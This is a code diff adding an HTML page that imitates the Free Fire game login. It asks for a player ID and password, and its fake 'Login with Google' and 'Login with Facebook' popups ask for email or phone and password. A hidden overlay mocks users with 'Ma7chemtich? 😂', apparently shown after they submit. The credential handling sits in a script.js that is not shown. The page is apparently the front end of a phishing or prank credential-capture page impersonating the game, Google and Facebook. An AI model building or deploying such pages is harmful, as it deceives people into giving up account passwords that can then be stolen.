@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Fire Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-box">
+    <h2>Free Fire Login</h2>
+    <input type="text" id="uid" placeholder="Player ID">
+    <input type="password" id="pass" placeholder="Password">
+    <button onclick="sendDefaultLogin()">Login</button>
+    <div class="social-login">
+      <button onclick="showPopup('Google')">Login with Google</button>
+      <button onclick="showPopup('Facebook')">Login with Facebook</button>
+    </div>
+  </div>
+
+  <!-- Popup modal -->
+  <div id="popup" class="popup hidden">
+    <div class="popup-content">
+      <h3 id="popup-title">Login</h3>
+      <input type="text" id="popup-user" placeholder="Email or phone">
+      <input type="text" id="popup-username" placeholder="Username (optional)">
+      <input type="password" id="popup-pass" placeholder="Password">
+      <button onclick="submitPopup()">Continue</button>
+      <button onclick="closePopup()">Cancel</button>
+    </div>
+  </div>
+
+  <!-- Funny overlay message -->
+  <div id="hafid-warning" class="hafid hidden">
+    <img src="l7fozli9_face.png" alt="Ma7chemtich?" width="100">
+    <p>Ma7chemtich? 😂</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
